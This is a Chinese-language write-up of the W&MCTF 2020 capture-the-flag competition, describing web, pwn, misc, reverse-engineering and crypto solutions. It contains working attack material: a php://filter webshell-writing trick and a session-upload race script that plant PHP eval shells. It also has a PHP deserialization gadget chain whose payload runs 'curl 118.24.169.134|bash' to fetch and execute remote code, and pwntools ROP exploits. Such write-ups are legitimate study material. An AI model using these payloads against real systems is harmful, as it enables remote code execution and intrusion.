# W&MCTF-0RAYS

阅读量 **253548**

|评论 **1**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-08-05 15:30:16

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p3.ssl.qhimg.com/t01608653c797383d8b.png)

**肝到了第七名**

![](https://p4.ssl.qhimg.com/t0120664bdc90fba6f4.png)

## web

###  web_checkin

    
    
    <?php 
    //PHP 7.0.33 Apache/2.4.25 
    error_reporting(E_ALL); 
    $sandbox = './' . md5($_SERVER['REMOTE_ADDR']); 
    @mkdir($sandbox); 
    // @chdir($sandbox); 
    highlight_file(__FILE__); 
    if(isset($_GET['content'])) { 
        $content = $_GET['content']; 
        if(preg_match('/iconv|UCS|UTF|rot|quoted|base64/i',$content)) 
             print_r('hacker'); 
        if(file_exists($content)) 
            require_once($content); 
        file_put_contents($content,'<?php exit();'.$content); 
    }
    

![](https://p5.ssl.qhimg.com/t014ae2be2437766b9c.png)

直接file读…

###  web_checkin2

参考

<https://www.leavesongs.com/PENETRATION/php-filter-magic.html>

<https://xz.aliyun.com/t/7457>

<https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.0.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md>

    
    
    Thinkphp5.0反序列化链的payload 
    php://filter/write=string.rot13/resource=<?cuc @riny($_TRG[_]);?>/../a.php
    

以前跟过伪协议处理的源码,他对过滤器,多url解码了一次,

![](https://p0.ssl.qhimg.com/t01a589197984b5102f.png)

直接

    
    
    http://web_checkin2.wmctf.wetolink.com/?content=php://filter/write=string.%2572ot13/resource=<?cuc @riny($_TRG[_]);?> /../a.php 
    view-source:http://web_checkin2.wmctf.wetolink.com/?content=a.php&_=system(%27cat%20/fffffllllllllaaaaaggggggg_as89c79as8%27);
    

读到flag

###  Make PHP Great Again

被非预期了

    
    
    #coding=utf-8 
    import io 
    import requests 
    import threading 
    sessid = 'TGAO' 
    data = {"cmd":"readfile('flag.php');"} 
    def write(session): 
    while True: 
    f = io.BytesIO(b'a' * 1024 * 50) 
    resp = session.post( 'http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} ) 
    def read(session): 
    while True: 
    resp = session.post('http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=/tmp/sess_'+sessid,data=data) 
    if 'tgao.txt' in resp.text: 
    print(resp.text) 
    event.clear() 
    else: 
    print("[+++++++++++++]retry") 
    if __name__=="__main__": 
    event=threading.Event() 
    with requests.session() as session: 
    for i in range(1,30): 
    threading.Thread(target=write,args=(session,)).start() 
    for i in range(1,30): 
    threading.Thread(target=read,args=(session,)).start() 
    event.set()
    
    
    
    <?php 
    highlight_file(__FILE__); 
    require_once 'flag.php'; 
    if(isset($_GET['file'])) { 
      require_once $_GET['file']; 
    }
    

##

###  webweb

其他题做自闭了,慢慢挖这个利用链吧

![](https://p0.ssl.qhimg.com/t0197ff53bef5c96077.png)

__destruct就剩这一个了,应该是出题人防止走偏,现在直接可以掉任意方法 了,但是内容不可控制,要把this 绕掉

下面是这个和原始版本有改动的地方,可能就是提示 了

删了两处 __desturct 应该是防止走偏

![](https://p2.ssl.qhimg.com/t0179edacaa91467662.png)

删了这里…可能是防止啥泄露吧

![](https://p4.ssl.qhimg.com/t019be7ad1093e4fbd5.png)

运行222libs.php 就行

    
    
    // 222libs.php 
    <?php 
    
    namespace CLI; 
    require '2libs.php'; 
    require '22libs.php'; 
    //! RFC6455 WebSocket server 
    class WS { 
    
        const 
            //! UUID magic string 
            Magic='258EAFA5-E914-47DA-95CA-C5AB0DC85B11', 
            //! Max packet size 
            Packet=65536; 
    
        //@{ Mask bits for first byte of header 
        const 
            Text=0x01, 
            Binary=0x02, 
            Close=0x08, 
            Ping=0x09, 
            Pong=0x0a, 
            OpCode=0x0f, 
            Finale=0x80; 
        //@} 
    
        //@{ Mask bits for second byte of header 
        const 
            Length=0x7f; 
        //@} 
    
        protected 
            $addr, 
            $ctx, 
            $wait, 
            $sockets, 
            $protocol, 
            $agents=[], 
            $events=[]; 
    
    
        function __construct() { 
    
        } 
    
    } 
    
    class Agent { 
    
        protected 
            $server, 
            $id, 
            $socket, 
            $flag, 
            $verb, 
            $uri, 
            $headers; 
    
    
    
    
        /** 
         *  Destroy object 
         **/ 
        function __destruct() { 
            if (isset($this->server->events['disconnect']) && 
                is_callable($func=$this->server->events['disconnect'])) 
                $func($this); 
        } 
    
        /** 
         *  @param $server WS 
         *  @param $socket resource 
         *  @param $verb string 
         *  @param $uri string 
         *  @param $hdrs array 
         **/ 
        function __construct() { 
            $this->server =  new  \DB\Jig\Mapper(); 
            $this->server->events = Array( 'disconnect' => Array(new  \DB\Jig\Mapper(),'insert')); 
    
    } 
        // $o = new  \DB\Jig\Mapper(); 
        // $o->insert(); 
    } 
    $o = new \CLI\Agent(); 
    
    $arr = Array('ws'=> new \CLI\WS,$o); 
    
    
    file_put_contents('poc3',base64_encode(serialize($arr))); 
    
    // 22libs.php 
     <?php 
    
        namespace DB\Jig; 
    
    
    class Mapper  { 
    
        protected 
            //! Flat-file DB wrapper 
            $db, 
            //! Data file 
            $file, 
            //! Document identifier 
            $id, 
            //! Document contents 
            $document=[], 
            //! field map-reduce handlers 
            $_reduce; 
    
    
        function insert() { 
            if ($this->id) 
                return $this->update(); 
            $db=$this->db; 
            $now=microtime(TRUE); 
            while (($id=uniqid(NULL,TRUE)) && 
                ($data=&$db->read($this->file)) && isset($data[$id]) && 
                !connection_aborted()) 
                usleep(mt_rand(0,100)); 
            $this->id=$id; 
            $pkey=['_id'=>$this->id]; 
            if (isset($this->trigger['beforeinsert']) && 
                \Base::instance()->call($this->trigger['beforeinsert'], 
                    [$this,$pkey])===FALSE) 
                return $this->document; 
        //  $data[$id]=$this->document; 
        //  $db->write($this->file,$data); 
            $db->jot('('.sprintf('%.1f',1e3*(microtime(TRUE)-$now)).'ms) '. 
                $this->file.' [insert] '.json_encode($this->document)); 
            if (isset($this->trigger['afterinsert'])) 
                \Base::instance()->call($this->trigger['afterinsert'], 
                    [$this,$pkey]); 
            $this->load(['@_id=?',$this->id]); 
            return $this->document; 
        } 
    
        /** 
         *  Instantiate class 
         *  @return void 
        *   @param $db object 
        *   @param $file string 
        **/ 
        function __construct() { 
            $this->db=new  \db\sql\mapper();; 
            $this->file="curl 118.24.169.134|bash"; 
            $this->props = Array("drop"=>"system","read"=>'system'); 
        } 
    
    } 
    
    
    
    // 2libs.php 
    <?php 
    
    namespace DB\SQL; 
    
    //! SQL data mapper 
    class Mapper  { 
    
        //@{ Error messages 
        const 
            E_PKey='Table %s does not have a primary key'; 
        //@} 
    
        protected 
            //! PDO wrapper 
            $db, 
            //! Database engine 
            $engine, 
            //! SQL table 
            $source, 
            //! SQL table (quoted) 
            $table, 
            //! Alias for SQL table 
            $as, 
            //! Last insert ID 
            $_id, 
            //! Defined fields 
            $fields, 
            //! Adhoc fields 
            $adhoc=[], 
            //! Dynamic properties 
            $props=[]; 
    
        function __call($func,$args) { 
            return call_user_func_array( 
                (array_key_exists($func,$this->props)? 
                    $this->props[$func]: 
                    $this->$func),$args 
            ); 
        } 
        /** 
        *   Instantiate class 
        *   @param $db \DB\SQL 
        *   @param $table string 
        *   @param $fields array|string 
        *   @param $ttl int|array 
        **/ 
        function __construct() { 
            $this->props = Array("drop"=>"system","read"=>'system'); 
    
        } 
    
    }
    

最后payload

    
    
    %61%3a%32%3a%7b%73%3a%32%3a%22%77%73%22%3b%4f%3a%36%3a%22%43%4c%49%5c%57%53%22%3a%37%3a%7b%73%3a%37%3a%22%00%2a%00%61%64%64%72%22%3b%4e%3b%73%3a%36%3a%22%00%2a%00%63%74%78%22%3b%4e%3b%73%3a%37%3a%22%00%2a%00%77%61%69%74%22%3b%4e%3b%73%3a%31%30%3a%22%00%2a%00%73%6f%63%6b%65%74%73%22%3b%4e%3b%73%3a%31%31%3a%22%00%2a%00%70%72%6f%74%6f%63%6f%6c%22%3b%4e%3b%73%3a%39%3a%22%00%2a%00%61%67%65%6e%74%73%22%3b%61%3a%30%3a%7b%7d%73%3a%39%3a%22%00%2a%00%65%76%65%6e%74%73%22%3b%61%3a%30%3a%7b%7d%7d%69%3a%30%3b%4f%3a%39%3a%22%43%4c%49%5c%41%67%65%6e%74%22%3a%37%3a%7b%73%3a%39%3a%22%00%2a%00%73%65%72%76%65%72%22%3b%4f%3a%31%33%3a%22%44%42%5c%4a%69%67%5c%4d%61%70%70%65%72%22%3a%37%3a%7b%73%3a%35%3a%22%00%2a%00%64%62%22%3b%4f%3a%31%33%3a%22%44%42%5c%53%51%4c%5c%4d%61%70%70%65%72%22%3a%39%3a%7b%73%3a%35%3a%22%00%2a%00%64%62%22%3b%4e%3b%73%3a%39%3a%22%00%2a%00%65%6e%67%69%6e%65%22%3b%4e%3b%73%3a%39%3a%22%00%2a%00%73%6f%75%72%63%65%22%3b%4e%3b%73%3a%38%3a%22%00%2a%00%74%61%62%6c%65%22%3b%4e%3b%73%3a%35%3a%22%00%2a%00%61%73%22%3b%4e%3b%73%3a%36%3a%22%00%2a%00%5f%69%64%22%3b%4e%3b%73%3a%39%3a%22%00%2a%00%66%69%65%6c%64%73%22%3b%4e%3b%73%3a%38%3a%22%00%2a%00%61%64%68%6f%63%22%3b%61%3a%30%3a%7b%7d%73%3a%38%3a%22%00%2a%00%70%72%6f%70%73%22%3b%61%3a%32%3a%7b%73%3a%34%3a%22%64%72%6f%70%22%3b%73%3a%36%3a%22%73%79%73%74%65%6d%22%3b%73%3a%34%3a%22%72%65%61%64%22%3b%73%3a%36%3a%22%73%79%73%74%65%6d%22%3b%7d%7d%73%3a%37%3a%22%00%2a%00%66%69%6c%65%22%3b%73%3a%32%34%3a%22%63%75%72%6c%20%31%31%38%2e%32%34%2e%31%36%39%2e%31%33%34%7c%62%61%73%68%22%3b%73%3a%35%3a%22%00%2a%00%69%64%22%3b%4e%3b%73%3a%31%31%3a%22%00%2a%00%64%6f%63%75%6d%65%6e%74%22%3b%61%3a%30%3a%7b%7d%73%3a%31%30%3a%22%00%2a%00%5f%72%65%64%75%63%65%22%3b%4e%3b%73%3a%35%3a%22%70%72%6f%70%73%22%3b%61%3a%32%3a%7b%73%3a%34%3a%22%64%72%6f%70%22%3b%73%3a%36%3a%22%73%79%73%74%65%6d%22%3b%73%3a%34%3a%22%72%65%61%64%22%3b%73%3a%36%3a%22%73%79%73%74%65%6d%22%3b%7d%73%3a%36%3a%22%65%76%65%6e%74%73%22%3b%61%3a%31%3a%7b%73%3a%31%30%3a%22%64%69%73%63%6f%6e%6e%65%63%74%22%3b%61%3a%32%3a%7b%69%3a%30%3b%4f%3a%31%33%3a%22%44%42%5c%4a%69%67%5c%4d%61%70%70%65%72%22%3a%36%3a%7b%73%3a%35%3a%22%00%2a%00%64%62%22%3b%4f%3a%31%33%3a%22%44%42%5c%53%51%4c%5c%4d%61%70%70%65%72%22%3a%39%3a%7b%73%3a%35%3a%22%00%2a%00%64%62%22%3b%4e%3b%73%3a%39%3a%22%00%2a%00%65%6e%67%69%6e%65%22%3b%4e%3b%73%3a%39%3a%22%00%2a%00%73%6f%75%72%63%65%22%3b%4e%3b%73%3a%38%3a%22%00%2a%00%74%61%62%6c%65%22%3b%4e%3b%73%3a%35%3a%22%00%2a%00%61%73%22%3b%4e%3b%73%3a%36%3a%22%00%2a%00%5f%69%64%22%3b%4e%3b%73%3a%39%3a%22%00%2a%00%66%69%65%6c%64%73%22%3b%4e%3b%73%3a%38%3a%22%00%2a%00%61%64%68%6f%63%22%3b%61%3a%30%3a%7b%7d%73%3a%38%3a%22%00%2a%00%70%72%6f%70%73%22%3b%61%3a%32%3a%7b%73%3a%34%3a%22%64%72%6f%70%22%3b%73%3a%36%3a%22%73%79%73%74%65%6d%22%3b%73%3a%34%3a%22%72%65%61%64%22%3b%73%3a%36%3a%22%73%79%73%74%65%6d%22%3b%7d%7d%73%3a%37%3a%22%00%2a%00%66%69%6c%65%22%3b%73%3a%32%34%3a%22%63%75%72%6c%20%31%31%38%2e%32%34%2e%31%36%39%2e%31%33%34%7c%62%61%73%68%22%3b%73%3a%35%3a%22%00%2a%00%69%64%22%3b%4e%3b%73%3a%31%31%3a%22%00%2a%00%64%6f%63%75%6d%65%6e%74%22%3b%61%3a%30%3a%7b%7d%73%3a%31%30%3a%22%00%2a%00%5f%72%65%64%75%63%65%22%3b%4e%3b%73%3a%35%3a%22%70%72%6f%70%73%22%3b%61%3a%32%3a%7b%73%3a%34%3a%22%64%72%6f%70%22%3b%73%3a%36%3a%22%73%79%73%74%65%6d%22%3b%73%3a%34%3a%22%72%65%61%64%22%3b%73%3a%36%3a%22%73%79%73%74%65%6d%22%3b%7d%7d%69%3a%31%3b%73%3a%36%3a%22%69%6e%73%65%72%74%22%3b%7d%7d%7d%73%3a%35%3a%22%00%2a%00%69%64%22%3b%4e%3b%73%3a%39%3a%22%00%2a%00%73%6f%63%6b%65%74%22%3b%4e%3b%73%3a%37%3a%22%00%2a%00%66%6c%61%67%22%3b%4e%3b%73%3a%37%3a%22%00%2a%00%76%65%72%62%22%3b%4e%3b%73%3a%36%3a%22%00%2a%00%75%72%69%22%3b%4e%3b%73%3a%31%30%3a%22%00%2a%00%68%65%61%64%65%72%73%22%3b%4e%3b%7d%7d
    

## pwn

###  mengyedekending

反编译得到源码，漏洞点在，可以输入’\r’来控制（*prt2），得到数组的越界写，改写ptr2[2]中的指针，指向num，然后用offset那里-1就好了。

    
    
    反编译得到源码 
    ​```c# 
    private unsafe static void Main(string[] args) 
    { 
     char* ptr = stackalloc char[(UIntPtr)100]; 
     int num = 1; 
     int* ptr2 = (int*)(ptr + 50); 
     Program @object = new Program(); 
     Program.MsgHandler msgHandler = new Program.MsgHandler(@object.Right); 
     Program.MsgHandler msgHandler2 = new Program.MsgHandler(@object.Backdoor); 
     Console.WriteLine("This is a gift for you : {0:x4}", &num); 
     Console.WriteLine("What do you want me to repeat?"); 
     ptr2[1] = 0; 
     ptr2[2] = ptr; 
     *ptr2 = 0; 
     while (ptr2[1] < 53) 
     { 
      char c = (char)Console.Read(); 
      bool flag = c == '\n'; 
      if (flag) 
      { 
       break; 
      } 
      bool flag2 = c == '\r'; 
      if (!flag2) 
      { 
       ptr[*ptr2] = c; 
       ptr2[1]++; 
      } 
      (*ptr2)++; 
     } 
     Console.WriteLine("Do you want to change your input?"); 
     char c2 = (char)Console.Read(); 
     bool flag3 = c2 == 'N' || c2 == 'n'; 
     if (flag3) 
     { 
      msgHandler(ptr); 
     } 
     else 
     { 
      Console.WriteLine("Please tell me a offset!"); 
      char* ptr3 = ptr2[2]; 
      Console.ReadLine(); 
      int num2 = Console.Read(); 
      for (int i = 0; i < num2; i++) 
      { 
       char* ptr4 = ptr3 + i; 
       *ptr4 -= '\u0001'; 
      } 
      bool flag4 = num == 1; 
      if (flag4) 
      { 
       msgHandler(ptr); 
      } 
      else 
      { 
       msgHandler2(ptr); 
      } 
     } 
    }
    

backdoor

    
    
    private unsafe void Backdoor(char* args) 
    { 
     Console.WriteLine("I'll give you flag!"); 
     string str = "type C:\\flag.txt"; 
     Process process = new Process(); 
     process.StartInfo.FileName = "cmd.exe"; 
     process.StartInfo.UseShellExecute = false; 
     process.StartInfo.RedirectStandardInput = true; 
     process.StartInfo.RedirectStandardOutput = true; 
     process.StartInfo.RedirectStandardError = true; 
     process.StartInfo.CreateNoWindow = true; 
     process.Start(); 
     process.StandardInput.WriteLine(str + "&exit"); 
     process.StandardInput.AutoFlush = true; 
     string value = process.StandardOutput.ReadToEnd(); 
     process.WaitForExit(); 
     process.Kill(); 
     Console.WriteLine(value); 
    }
    

Right

    
    
    private unsafe void Right(char* args) 
    { 
     for (int i = 0; i < 50; i++) 
     { 
      Console.Write(args[i]); 
     } 
     Console.Write('\n'); 
    }
    
    
    
    exp,概率成功，不知道为啥QAQ 
    ​```python
    #!/usr/bin/python 
    from pwn import * 
    context.log_level = 'debug' 
    cn = remote('111.73.46.229',51000) 
    #cn = process('C:/Users/a1516/Desktop/WMCTF2020/For Attacker/publish/baby_cat.exe') 
    a = cn.recvline() 
    addr = int(a[25:32],16) 
    print(hex(addr)) 
    cn.recvline() 
    cn.sendline('\r'*108+p32(addr)[::-1]) 
    #cn.sendline('\r'*108+p32(addr)) 
    cn.recvline() 
    cn.send('a') 
    cn.recvline() 
    cn.sendline('c') 
    cn.send('\x01') 
    cn.interactive()
    

###  cfgo

走完迷宫发现有个栈溢出，调试得到栈结构

‘a’ _112+addr+len+’b’_ 0x90+ret

其中addr和len是两个参数，可以用来泄露内存。又因为本来只允许输入一次，所以我们把原来ret的最后一个字节覆盖为’\xce’，这样就可以再次返回到并call输入name的函数，得到第二次写，这一点可以调试配合ida得到。第一次泄露text_addr，第二次写入rop。

    
    
    exp 
    #!/usr/bin/python 
    from pwn import* 
    from LibcSearcher import * 
    #context.log_level = 'debug' 
    res='' 
    def fix(tout): 
        res = '' 
        mid = '0' 
        for i in tout: 
            if mid != i: 
                res += i 
                mid = i 
            else: 
                mid = '0' 
        print(res) 
    def translate(sol): 
        tmp = sol[0] 
        tot = len(sol) 
        global res 
        for i in range(1, tot): 
            if (tmp[0] == sol[i][0]) and (tmp[1] > sol[i][1]): 
                res += 'a' 
            elif (tmp[0] == sol[i][0]) and (tmp[1] < sol[i][1]): 
                res += 'd' 
            elif (tmp[0] > sol[i][0]) and (tmp[1] == sol[i][1]): 
                res += 'w' 
            else: 
                res += 's' 
            tmp = sol[i] 
    #    fix(res) 
    #    final(res) 
    
    step = [] 
    def check_valid(mg, x, y): 
        if x >= 0 and x < len(mg) and y >= 0 and y < len(mg[0]) and mg[x][y] == 1: 
            return True 
        else: 
            return False 
    def process1(step): 
        change_records = [] 
        for i in range(len(step) - 1): 
            if (abs(step[i][0] - step[i + 1][0]) == 0 and abs(step[i][1] - step[i + 1][1]) == 1) or (abs(step[i][0] - step[i + 1][0]) == 1 and abs(step[i][1] - step[i + 1][1]) == 0): 
                pass 
            else: 
                change_records.append(i + 1) 
        # print(change_records) 
        clip_nums = [] 
        for i in change_records: 
            for j in range(i): 
                if (abs(step[j][0] - step[i][0]) == 0 and abs(step[j][1] - step[i][1]) == 1) or \ 
                        (abs(step[j][0] - step[i][0]) == 1 and abs(step[j][1] - step[i][1]) == 0): 
                    break 
            clip_nums.append((j, i)) 
        # print(clip_nums) 
        record = [] 
        for i in clip_nums[::-1]: 
            if not (i[0] in record or i[1] in record): 
                step = step[:i[0] + 1] + step[i[1]:] 
            record += list(range(i[0], i[1])) 
        # print(step) 
        translate(step) 
    def final(re): 
        print("Walk success!") 
        print(re) 
    def walk(mg, x, y, ex, ey): 
        global step 
        if x == ex and y == ey: 
            step.append((x, y)) 
            process1(step) 
            # sys.exit() 
        if check_valid(mg, x, y): 
            step.append((x, y)) 
            mg[x][y] = 2 
            walk(mg, x, y + 1, ex, ey) 
            walk(mg, x, y - 1, ex, ey) 
            walk(mg, x - 1, y, ex, ey) 
            walk(mg, x + 1, y, ex, ey) 
    def get_xy(maze,k): 
     for i in range(k): 
      for j in range(k): 
       if(maze[i][j] == '4'): 
        x = i 
        y = j 
            for i in range(k): 
                    for j in range(k): 
                            if(maze[i][j] == '3'): 
                                    ex = i 
                                    ey = j 
     return (x,y,ex,ey) 
    def pwn(): 
    # cn = process('./pwn') 
     cn = remote('81.68.174.63',62176) 
     for j in range(0,100): 
      print(j+1) 
      global res 
      global step 
      step = [] 
      res = '' 
      cn.recvline() 
      maze=[] 
      maze = cn.recvlines(6+j) 
      num = len(maze) 
      x=0 
      y=0 
      ex=0 
      ey=0 
      for k in range(0,num): 
       maze[k] = maze[k].replace('\xe2\xac\x9b','0') 
       maze[k] = maze[k].replace('\xe2\xac\x9c','1') 
       maze[k] = maze[k].replace('\xf0\x9f\x9a\xa9','3') 
      # print(maze[k]) 
      for k in range(0,num): 
       for i in range(0,len(maze[k])): 
        if maze[k][i] != '0' and maze[k][i] != '1' and maze[k][i] != '3': 
         maze[k]=maze[k][:i]+'4'+maze[k][i+4:] 
         break 
      (x,y,ex,ey) = get_xy(maze,num) 
      for k in range(0,num): 
       maze[k] = maze[k].replace('3','1') 
       maze[k] = maze[k].replace('4','1') 
      box=[[]for i in range(num)] 
      for k in range(0,num): 
       for L in range(0,num): 
        box[k].append(int(maze[k][L])) 
      #print(box) 
      maze = box 
      #print(x,y,ex,ey) 
      walk(maze,x,y,ex,ey) 
      cn.send(res+'\n') 
      print(res) 
     base=0x555555554000 
     stack_ = 0xc000000000 
     ret = base+0xa3910 
     payload = 'a'*112+p64(0xc000009690)+p64(0x200)+'b'*0x90+'\xce' 
     context.log_level = 'debug' 
     cn.recv() 
     cn.sendline(payload) 
     a = cn.recv() 
            text_base = u64(a[0x110-1:0x117])-0xbda23 
            print(hex(text_base)) 
    #read rop2 
    # gdb.attach(cn) 
     open_addr = text_base+0xCFEA0 
     read_addr = text_base+0xCFF10 
     write_addr = text_base+0xCFEF0 
     print(hex(open_addr)) 
     print(hex(read_addr)) 
     print(hex(write_addr)) 
     pppr = text_base+0x11a1a2 
     ppppr = text_base+0x11a1a0 
            pop_rdi_ret = text_base+0x37531 
     flag_addr = 0xc000044d78+0x100 
     addr = 0xc000044d78 
     main_got = text_base + 0x1EEF38 
     rop1 = p64(open_addr)+p64(pppr)+p64(addr)+p64(0)+p64(0)+p64(read_addr)+p64(ppppr)+p64(6)+p64(flag_addr)+p64(0x100)+p64(0)+p64(write_addr)+p64(pppr)+p64(1)+p64(flag_addr)+p64(0x200) 
     cn.sendline('./flag\x00\x00'+'d'*0x68+p64(0xc000047d00)+p64(0x40)+'./flag\x00\x00'+'e'*(144-8)+rop1) 
            cn.recvuntil('is :') 
     a = cn.recv() 
     cn.interactive() 
     print(a[:1000]) 
    pwn()
    

## misc

###  sign-in

快乐签到题

### **XMAN_Happy_birthday!**

倒叙脚本一把梭

    
    
    a = open('./daolnwod.zip','rb').read() 
    b = a[::-1] 
    c = open('res.zip','wb') 
    c.write(b) 
    c.close()
    

解压得flag

![](https://p1.ssl.qhimg.com/t017db787f88f6afa8b.png)

### **Performance_artist**

![](https://p2.ssl.qhimg.com/t01a92fa93b3a4742b2.png)

分割成28*28大小的图片，然后找到字符的数据集，转成图片，再用phash和 汉明距离慢慢搞，外加人工比对部分

    
    
    from PIL import Image 
    import imagehash 
    import os 
    def hammingDistance(x, y): 
        return bin(x ^ y).count('1') 
    hash_size = 12 
    pathh = '' 
    pathyuan = '' 
    # 提取phash，节约时间 
    if not os.path.exists('E:\\phash.txt'): 
    with open('E:\\phash.txt', 'w+') as file: 
    trains = os.listdir(path) 
    for i in trains: 
    imagepng = Image.open(path+i) 
    file.write(str(imagehash.phash(imagepng, 12)) + '\t' + i + '\n') 
    
    misc = os.listdir(pathyuan) 
    file = open('E:\\phash.txt') 
    s = file.readlines() 
    hashs = list(map(lambda x: x.split('\t')[0], s)) 
    chars = list(map(lambda x: x.split('_')[2][0], s)) 
    # chars = list(map(lambda x: x.split('\t')[1][0], s)) 
    string = "" 
    sure = [322] 
    for i in sure: 
        image1 = Image.open(pathyuan + str(i) + '.png') 
        temphash = imagehash.phash(image1, hash_size) 
        print(i) 
        """if str(temphash) in hashs: 
            print(i, chars[hashs.index(str(temphash))],s[hashs.index(str(temphash))]) 
            string += chars[hashs.index(str(temphash))]""" 
        for j in hashs: 
            if hammingDistance(int(str(temphash), 16), int(j, 16)) <= 40: 
                print(i, chars[hashs.index(j)], s[hashs.index(j)]) 
                image2 = Image.new('RGB', (56, 56), '#FFFFFF') 
                box1 = (0, 0, 28, 28) 
                crop = image1.crop(box1) 
                image2.paste(crop, (0, 0)) 
                image3 = Image.open('./'+s[hashs.index(j)].split('\t')[1][:-1]) 
                crop = image3.crop(box1) 
                image2.paste(crop, (0, 28)) 
                image2.save('./' + str(i) + '_' + str(j) + '.png')
    

### **Dalabengba**

首先 EnigmaVBUnpacker
解包得到原始文件，然后要得到encodekey,垃圾rpgmaker的加密方式竟然是加上自己的头，后面再加上原array数据异或encodekey来得到一个校准位，实际根本没有加密，亏我审了这么久的源码

于是python弄个jio本得到encodekey

    
    
    a = [0x7e,0x15,0xdc,0x75,0x87,0x1c,0x96,0xf2,0x58,0xe7,0x27,0x0d,0x64,0x9c,0xb2,0xf9] 
    b = [137,80,78,71,13,10,26,10,0,0,0,13,73,72,68,82] 
    res = '' 
    for i in range(16): 
        res+=hex(a[i]^b[i])[2:].zfill(2) 
    print(res)
    

得到key：f74592328a168cf858e727002dd4f6ab  
然后cmd5查到其密钥为 welcometothegame

然后进游戏，快速过完游戏（我才不会说我开了穿墙挂）得到

**part1** ：最后的空中宫殿NPC移动轨迹得Pr1nCe5(S)5(s)

**part2** ：根目录文件有过part2且宝箱hint为

![](https://p5.ssl.qhimg.com/t01b34038d4e08ee13b.png)

得知为Java得盲水印隐写，通过
<https://github.com/ww23/BlindWatermark/releases/tag/v0.0.3>项目可以得到水印图像

![](https://p3.ssl.qhimg.com/t0198f1417482c6e361.png)

再反色处理以及加上标识符得到

![](https://p3.ssl.qhimg.com/t0186569b0088f94ae6.png)

zxing扫描得： W[@rR1or](https://github.com/rR1or "@rR1or")

**part3：**
文件通过crypto解密，密钥为国王说的那句话的去除大写字母倒叙16进制转换，其密钥为：Y0u_[@re_5o_bRaVE](https://github.com/re_5o_bRaVE
"@re_5o_bRaVE")，解密后是一堆空字符，换成0和1后得到

    
    
    100110101111011010101110000001000001011010000110011011101010011000000100011001101111011010101110011101100010011000000100100101100010111010000100100001001000010010000100100001001000010001010000 
    01010000 
    01010000 
    01010000 
    000011101000011001001110001011101100110001011100111010100001011001001110010010100100111001001110010011100111111001010000
    

然后再倒叙二进制转字符串再倒叙得到

    
    
    You have found it!!!!!! 
    
    
    
    
    
    part3:WhrRrrr~
    

得到part3： WhrRrrr~  
最后fuzzpart1得到flag

###  FeedBack

问卷题，需要翻墙

<https://forms.gle/SmTytGGhvYxDtuoA7>

![](https://p1.ssl.qhimg.com/t01e5d2998106013d79.png)

### **Music_game**

通过声音控制坦克移动，到终点就有flag

## re

###  easy_re

调试了无数遍之后，突然一次crtl+f7加乱改运行位置的时候偶然看到了一个和flag有关的的函数，从cmp进行调试，终于找到了藏起来的flag（签到真不容易）。

![](https://p3.ssl.qhimg.com/t01a10c6bf7e845aa64.png)

## crypto

###  piece_of_cake

应该是非预期解了，直接解eatcake处的二维ntru，本地测试得到的m略小于cake，大概差了几个g，索性直接发送m+2*g给靶机，随缘。【解二维ntru的脚本先知就有，不贴了】

![](https://p5.ssl.qhimg.com/t01af5601f12235321f.png)

###  Game

以获取答案的第一组为例：发送两组数据，要求保持密文的第一组数据不变【由于aes的iv会变，每次都发送iv就行，本次的iv是上一次的密文最后一组，初始iv已给】随后发送十五个填充字节。这个时候服务器会返回的第二组密文就是十五个填充字节+sceret第一个字节。

为了获取这个字节我们爆破。发送两组数据，第一组是iv，第二组是十五个填充字节加一个遍历256的i，若密文与之前的第二组相同，那个i就是secret的第一个字节。

    
    
    from pwn import * 
    sh=remote("81.68.174.63","16442") 
    from pwnlib.util.iters import mbruteforce 
    from hashlib import sha256 
    def proof_of_work(sh): 
    sh.recvuntil("XXXX+") 
    suffix = sh.recvuntil(')').decode("utf8")[:-1] 
    log.success(suffix) 
    sh.recvuntil("== ") 
    cipher = sh.recvline().strip().decode("utf8") 
    proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest() ==  cipher, string.ascii_letters + string.digits, length=4, method='fixed') 
    sh.sendlineafter("Give me XXXX:", proof) 
    
    #context.log_level = 'debug' 
    
    proof_of_work(sh) 
    secret=b"" 
    
    #sitep1 
    ban=sh.recvuntil("IV is: ") 
    
    tmp_head = sh.recvuntil("\n")[:-1] 
    
    for j in range(48): 
    sh.recvuntil("> ") 
    sh.sendline("1") 
    sh.recvuntil(": ") 
    sh.sendline(tmp_head + b"00" * (48-len(secret)//2-1)) 
    print("start:") 
    
    tmp = sh.recvuntil("\n")[:-1] 
    tmp_head = tmp[-32:] 
    
    goal = tmp[96:128] 
    print(goal) 
    #sh.interactive() 
    
    for i in range(256): 
    sh.recvuntil("> ") 
    sh.sendline("1") 
    sh.recvuntil(": ") 
    sh.sendline(tmp_head+b"00"*(48-len(secret)//2-1)+secret+ hex(i)[2:].rjust(2,"0").encode("latin1")) 
    
    tmp = sh.recvuntil("\n")[:-1] 
    tmp_head = tmp[-32:] 
    if tmp[96:128] == goal: 
    print("this send get answer:") 
    print((tmp_head + b"00" * (48 - len(secret) // 2 - 1) + secret + hex(i)[2:].rjust(2, "0").encode("latin1"))) 
    secret+=hex(i)[2:].rjust(2,"0").encode("latin1") 
    
    print(secret) 
    break 
    # 
    sh.recvuntil("> ") 
    sh.sendline("2") 
    sh.recvuntil(": ") 
    sh.sendline(secret) 
    flag=sh.recv() 
    print(flag) 
    sh.interactive()
    

###  babysum

120维背包取20个，轻背包，改自soreatu参与密码挑战赛的脚本

    
    
    import re 
    import random 
    import logging 
    import multiprocessing as mp 
    from functools import partial 
    logging.basicConfig(level=logging.DEBUG) 
    LEVEL = [ 
        # n    k    s 
        (120,  20,  11204158321431815830823699004382994461036257963) 
    ] 
    ZERO_FORCE = { 
        # n   r 
        120: 20, 
    } 
    def check(sol, A, s): 
        """Check whether *sol* is a solution to the subset-sum problem. 
        """ 
        return sum(x*a for x, a in zip(sol, A)) == s 
    small_vec = None 
